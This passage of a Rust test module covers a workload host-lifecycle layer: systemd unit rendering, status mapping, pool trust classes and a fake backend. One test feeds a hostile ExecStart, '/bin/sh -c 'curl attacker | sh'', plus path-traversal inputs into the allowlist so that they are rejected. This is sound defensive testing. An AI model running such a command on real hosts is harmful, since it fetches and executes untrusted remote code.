            RunnerSpec::krun("/run/nimbus/bundles/microvm").expect("krun runner spec should parse"),
        );
        assert_runner_exec(
            &systemd,
            "/usr/libexec/nimbus/nimbus-krun-runner",
            &["--bundle", "/run/nimbus/bundles/microvm"],
        );
    }

    fn render_runner_spec_to_systemd(spec: RunnerSpec) -> crate::SystemdStartTransientUnitRequest {
        let binding = binding();
        let request = spec
            .into_host_lifecycle_request(HostLifecycleBackendKind::SystemdTransientUnit)
            .expect("runner spec should lower to host lifecycle request");
        let plan = HostLifecyclePlan::from_binding(&binding, request)
            .expect("runner request should plan from admitted binding");
        crate::SystemdStartTransientUnitRequest::from_plan(&plan)
            .expect("runner plan should render to systemd transient unit request")
    }

    fn assert_runner_exec(
        systemd: &crate::SystemdStartTransientUnitRequest,
        executable: &str,
        args: &[&str],
    ) {
        let exec = systemd
            .properties()
            .iter()
            .find_map(|property| match property {
                crate::SystemdDbusProperty::ExecStart(exec) => Some(exec),
                _ => None,
            })
            .expect("systemd request should contain generated ExecStart");

        assert_eq!(exec.executable(), executable);
        assert_eq!(
            exec.args(),
            &args.iter().map(|arg| (*arg).to_owned()).collect::<Vec<_>>()
        );
    }

    #[test]
    fn raw_host_command_rejected_by_workload_control() {
        let raw_exec = HostLifecyclePropertySet::from_raw_systemd_properties([(
            "ExecStart",
            "/bin/sh -c 'curl attacker | sh'",
        )])
        .expect_err("raw ExecStart must not cross workload-control");
        assert!(
            raw_exec.to_string().contains("not allowlisted"),
            "raw ExecStart rejection should name the allowlist: {raw_exec}"
        );

        let relative_runner = RunnerSpec::krun("../run/nimbus/bundles/workload")
            .expect_err("runner bundle paths must be absolute and trusted");
        assert!(
            relative_runner
                .to_string()
                .contains("must be an absolute path"),
            "relative bundle rejection should be actionable: {relative_runner}"
        );

        let parent_segment = RunnerSpec::krun("/run/nimbus/../escape")
            .expect_err("runner bundle paths must reject traversal");
        assert!(
            parent_segment
                .to_string()
                .contains("parent-directory segments"),
            "parent segment rejection should be actionable: {parent_segment}"
        );
    }

    #[test]
    fn host_lifecycle_status_normalizes_backend_states_to_workload_status() {
        let binding = binding();
        let plan =
            HostLifecyclePlan::from_binding(&binding, request()).expect("plan should materialize");

        let ready = HostLifecycleStatus::from_backend_state(&plan, HostBackendObservedState::Ready);
        assert_eq!(ready.phase(), TenantWorkloadPhase::Ready);
        assert_eq!(ready.reason(), HostLifecycleStatusReason::Ready);
        let workload_status = ready
            .to_workload_status(&plan)
            .expect("ready lifecycle status should authorize observed status");
        assert_eq!(workload_status.phase(), TenantWorkloadPhase::Ready);
        assert_eq!(
            workload_status.evidence_correlation_ids(),
            &[plan.unit_name().as_str().to_string()]
        );

        let failed = HostLifecycleStatus::from_backend_state(
            &plan,
            HostBackendObservedState::Failed("launch denied".to_string()),
        );
        assert_eq!(failed.phase(), TenantWorkloadPhase::Denied);
        assert_eq!(failed.reason(), HostLifecycleStatusReason::Failed);
        assert_eq!(failed.message(), Some("launch denied"));
    }

    #[test]
    fn runtime_pool_trust_class_is_monotonic_and_requires_teardown_for_downgrade() {
        let mut state = RuntimePoolTrustState::new(RuntimePoolTrustClass::SingleTenant);
        assert!(state.can_reuse_for(RuntimePoolTrustClass::SingleTenant));

        state.record_exposure(RuntimePoolTrustClass::SharedTenant);
        assert_eq!(state.class(), RuntimePoolTrustClass::SharedTenant);
        assert!(state.requires_teardown_for(RuntimePoolTrustClass::SingleTenant));
        assert!(state.can_reuse_for(RuntimePoolTrustClass::SharedTenant));

        state.record_exposure(RuntimePoolTrustClass::ElevatedHostCapabilities);
        assert_eq!(
            state.class(),
            RuntimePoolTrustClass::ElevatedHostCapabilities
        );
        assert!(state.requires_teardown_for(RuntimePoolTrustClass::SharedTenant));

        state.record_exposure(RuntimePoolTrustClass::SingleTenant);
        assert_eq!(
            state.class(),
            RuntimePoolTrustClass::ElevatedHostCapabilities,
            "lower exposure must not downgrade a contaminated pool"
        );
    }

    #[tokio::test]
    async fn fake_backend_validates_plan_from_binding_and_tracks_status() {
        let backend = FakeHostLifecycleBackend::default();
        let binding = binding();
        let plan = backend
            .validate(&binding, request())
            .expect("fake backend should validate admitted binding");
        let workload_id = plan.workload_id().clone();

        let started = backend
            .start(plan)
            .await
            .expect("fake backend start should produce workload status");
        assert_eq!(started.phase(), TenantWorkloadPhase::Running);

        let inspected = backend
            .inspect(workload_id.clone())
            .await
            .expect("fake backend should track started workload");
        assert_eq!(inspected.reason(), HostLifecycleStatusReason::Running);

        let stopped = backend
            .stop(workload_id.clone())
            .await
            .expect("fake backend should stop tracked workload");
        assert_eq!(stopped.reason(), HostLifecycleStatusReason::Stopped);

        let inspected = backend
            .inspect(workload_id)
            .await
            .expect("fake backend should update stopped state");
        assert_eq!(inspected.reason(), HostLifecycleStatusReason::Stopped);
    }
}
